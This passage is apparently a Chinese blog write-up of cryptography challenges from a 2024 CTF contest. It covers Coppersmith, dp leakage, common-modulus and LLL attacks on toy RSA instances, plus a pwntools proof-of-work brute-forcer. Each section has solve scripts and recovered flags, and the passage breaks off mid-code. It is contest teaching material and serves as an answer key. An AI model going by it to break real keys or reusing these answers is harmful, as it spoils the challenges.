<h2 id="ezrsa"><a class="markdownIt-Anchor" href="#ezrsa"></a> ezRSA</h2>
<ul>
<li>模板题，而且题目也有给了提示coppersmith攻击</li>
<li>然后在网上了解一下原理之后就写脚本即可</li>
<li>这里通过h计算出m的高位</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h = <span class="number">111518648179416351438603824560360041496706848494616308866057817087295675324528913254309319829895222661760009533326673551072163865</span></span><br><span class="line">m_h = (h +<span class="number">2023</span>)//<span class="number">2024</span></span><br></pre></td></tr></table></figure>
<ul>
<li>然后使用sage解出m</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">98776098002891477120992675696155328927086322526307976337988006606436135336004472363084175941067711391936982491358233723506086793155908108571814951698009309071244571404116817767749308434991695075517682979438837852005396491907180020541510210086588426719828012276157990720969176680296088209573781988504138607511</span></span><br><span class="line">c = <span class="number">9379399412697943604731810117788765980709097637865795846842608472521416662350816995261599566999896411508374352899659705171307916591351157861393506101348972544843696221631571188094524310759046142743046919075577350821523746192424192386688583922197969461446371843309934880019670502610876840610213491163201385965</span></span><br><span class="line">h = <span class="number">111518648179416351438603824560360041496706848494616308866057817087295675324528913254309319829895222661760009533326673551072163865</span></span><br><span class="line">m_h = <span class="number">55098146333703730947926790790691720107068601034889480665048328600442527334253415639480889244019378785454550164687091675430912</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">kbits = <span class="number">150</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (m_h + x)^e - c</span><br><span class="line">x0 = f.small_roots(<span class="number">2</span>^kbits,<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">m = m_h + x0</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 55098146333703730947926790790691720107068601034889480665048328600442527334253416918933209078294725467152711309939550589383549</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>最后得到flag</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="number">55098146333703730947926790790691720107068601034889480665048328600442527334253416918933209078294725467152711309939550589383549</span>))</span><br><span class="line"><span class="comment"># SYC&#123;crypto_is_very_interesting_why_dont_you_join_us&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="nc"><a class="markdownIt-Anchor" href="#nc"></a> nc</h2>
<ul>
<li>题目如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;SYC&#123;...&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>(socketserver.BaseRequestHandler):</span><br><span class="line"></span><br><span class="line">    ctry = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recvall</span>(<span class="params">self</span>):</span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">self</span>):</span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        _hexdigest = sha256(proof.encode()).hexdigest()</span><br><span class="line">        self.send(<span class="string">f&quot;[+] sha256(XXXX+<span class="subst">&#123;proof[<span class="number">4</span>:]&#125;</span>) == <span class="subst">&#123;_hexdigest&#125;</span>&quot;</span>.encode())</span><br><span class="line">        x = self.recv(prompt=<span class="string">b&#x27;[+] Plz tell me XXXX: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:].encode()).hexdigest() != _hexdigest:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        signal.alarm(<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">                self.send(<span class="string">b&#x27;[!] Wrong!&#x27;</span>)</span><br><span class="line">                self.send(<span class="string">b&#x27;[*] Maybe you need a little force, right?&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.send(<span class="string">b&#x27;[*] HEY, MY NEW FRIENDDD, YOUUUUUU FIND THE RIGHT WAAAAAAY!&#x27;</span>)</span><br><span class="line">                self.send(<span class="string">b&#x27;[*] Or even more complex?&#x27;</span>)</span><br><span class="line">                self.send(<span class="string">b&#x27;[*] Maybe these details are not important.6 See below :D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            signal.alarm(<span class="number">400</span>)</span><br><span class="line">            self.send(<span class="string">b&#x27;[+] &#x27;</span>)</span><br><span class="line">            <span class="keyword">while</span> self.ctry &lt; <span class="number">35</span>:</span><br><span class="line">                data = self.recv().decode()</span><br><span class="line">                f = self.oraicle(data)</span><br><span class="line">                self.send(f)</span><br><span class="line">                self.ctry += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> TimeoutError:</span><br><span class="line">            self.send(<span class="string">b&#x27;[!] Ohhehe, Timeout!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oraicle</span>(<span class="params">self,a</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> a.isdigit() <span class="keyword">and</span> <span class="built_in">int</span>(a)&lt;<span class="number">33</span> <span class="keyword">and</span> <span class="built_in">int</span>(a)&gt;<span class="number">0</span>:</span><br><span class="line">            a = <span class="built_in">int</span>(a)-<span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;[+] &#x27;</span> + flag[a].encode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  <span class="string">b&#x27;[!] Invalid Member!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST,PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">12321</span></span><br><span class="line">    server = ForkedServer((HOST,PORT),Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(HOST, PORT)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
<ul>
<li>该题附件大致就是，随机生成可显字符串，然后将可显字符串进行sha256加密，并将sha256值告诉我们，题目要我们求随机生成的可显字符串的前4个字符</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115184257465.png" alt="image-20241115184257465"></p>
<ul>
<li>解出来后就可以逐个获取flag了，既然只叫我们求前4个字符，那么就直接明文爆破即可</li>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">26474</span>)</span><br><span class="line">b = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(b[<span class="number">16</span>:<span class="number">32</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">b&#x27;[+] sha256(XXXX+1tuW6mg1waiCb5F9) == &#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(b[<span class="number">37</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">b&#x27; [+] &#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; [+] &lt;\n&#x27;</span>[<span class="number">5</span>])</span><br><span class="line">q = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">    a = b[<span class="number">16</span>:<span class="number">32</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> g <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> string.printable:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">                c = i + g + h + j + a</span><br><span class="line">                c = c.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                d = hashlib.sha256(c).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> d == b[<span class="number">37</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(i+g+h+j)</span><br><span class="line">                    p.sendlineafter(<span class="string">b&#x27;Plz tell me XXXX:&#x27;</span>,(i+g+h+j).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                    <span class="keyword">for</span> count <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>):</span><br><span class="line">                        p.sendlineafter(<span class="string">b&#x27;[-]&#x27;</span>,<span class="built_in">str</span>(count).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                        qq = p.recvline()</span><br><span class="line">                        qqq = qq.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(qqq)</span><br><span class="line">                        q += qqq[<span class="number">5</span>]</span><br><span class="line">                        <span class="built_in">print</span>(q)</span><br></pre></td></tr></table></figure>
<ul>
<li>得到flag如下：<code>SYC&#123;MAYB3_Y0U_KN0W_A1AN-B3&lt;K3R?&#125;</code></li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115184436517.png" alt="image-20241115184436517"></p>
<h2 id="dp"><a class="markdownIt-Anchor" href="#dp"></a> dp</h2>
<ul>
<li>dp泄露模版题目，根据已知可以推出这个式子，从而得到攻击方法，遍历后得到满足条件的值，该值就为<code>p-1</code></li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115191630884.png" alt="image-20241115191630884"></p>
<ul>
<li>这样就可以得到p，n就可以分解了</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c =  <span class="number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span></span><br><span class="line">n =  <span class="number">157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">dp =  <span class="number">2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">	<span class="keyword">if</span>(e*dp%x==<span class="number">1</span>):</span><br><span class="line">		p=(e*dp-<span class="number">1</span>)//x+<span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span>(n%p!=<span class="number">0</span>):</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		q=n//p</span><br><span class="line">		phin=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">		d=gmpy2.invert(e, phin)</span><br><span class="line">		m=<span class="built_in">pow</span>(c, d, n)</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">len</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])%<span class="number">2</span>==<span class="number">1</span>):</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;--------------&#x27;</span>)</span><br><span class="line">		<span class="built_in">print</span>(m)</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>
<h2 id="共模攻击"><a class="markdownIt-Anchor" href="#共模攻击"></a> 共模攻击</h2>
<ul>
<li>
<p>共模攻击该题就是模数n相同，e1，e2不同，所以c1=pow(m,e1,n)，c2 = pow(m,e2,n)</p>
</li>
<li>
<p>题目如下：</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p,q = [getPrime(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)] </span><br><span class="line">n = p*q</span><br><span class="line">e = [getPrime(<span class="number">10</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = [<span class="built_in">pow</span>(m, e[i], n) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e1 = <span class="subst">&#123;e[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e2 = <span class="subst">&#123;e[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span></span><br><span class="line"><span class="string">e1 = 911</span></span><br><span class="line"><span class="string">e2 = 967</span></span><br><span class="line"><span class="string">c1 = 18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span></span><br><span class="line"><span class="string">c2 = 4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以直接使用拓展欧几里得算法，得到s1、s2，然后最后再套用公式，即可得到答案</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115192203753.png" alt="image-20241115192203753"></p>
<ul>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span></span><br><span class="line">e1 = <span class="number">911</span></span><br><span class="line">e2 = <span class="number">967</span></span><br><span class="line">c1 = <span class="number">18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span></span><br><span class="line">c2 = <span class="number">4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span></span><br><span class="line">s,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line">m=(<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n))%n</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure>
<ul>
<li>flag：<code>SYC&#123;U_can_really_attack&#125;</code></li>
</ul>
<h2 id="lll"><a class="markdownIt-Anchor" href="#lll"></a> LLL</h2>
<ul>
<li>这个就是一个简单的格密码入门题目，本题主要还是在调参数上。</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241118210215174.png" alt="image-20241118210215174"></p>
<ul>
<li>我这里直接选择爆破求参</li>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">b = <span class="number">169790849804323540946197204708402762862586197604183102589270741859708550301920348112941305999764092197996929298474590062625556806793613268527763774013772685954699561684244945434843656515307801882995934869499880288594142919381501796488815033294127591623260894764750214588993456840404443515671353802614450411717</span></span><br><span class="line">a = <span class="number">87985708831523238980948938165414984318379459926002798504435964538203443877988599888615810231215118828138306895572062833107988965151522391460216837691927960249874511818878134399363147008042562222910234739940697553852540265617603482995091203105040187460485673579382171260197291783748886765929376179151804062085</span></span><br><span class="line">p = <span class="number">131724494512065658801039766546788821718063963144467818735768040631367069153816254855229655449559099188694403260044990366292026916085340250077198735215774149087025577263769846650728593180101073940507285459917860726551385227481715873503612683249433020201729190862430476054822102865441136763977415824331858801617</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    Ge = Matrix(ZZ, [[<span class="number">2</span>^i, <span class="number">0</span>, a],</span><br><span class="line">                     [<span class="number">0</span>, <span class="number">1</span>, -b],</span><br><span class="line">                     [<span class="number">0</span>, <span class="number">0</span>, p]])</span><br><span class="line"></span><br><span class="line">    t, m, c = Ge.LLL()[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#print(m)</span></span><br><span class="line">    m = <span class="built_in">abs</span>(m)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241118210306344.png" alt="image-20241118210306344"></p>
<ul>
<li>flag：<code>SYC&#123;1e989433efffd767589e989ad0f091075c06&#125;</code></li>
</ul>
<h2 id="number-theory复现"><a class="markdownIt-Anchor" href="#number-theory复现"></a> Number theory(复现)</h2>
<ul>
<li>这题题目附件如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">p1 = 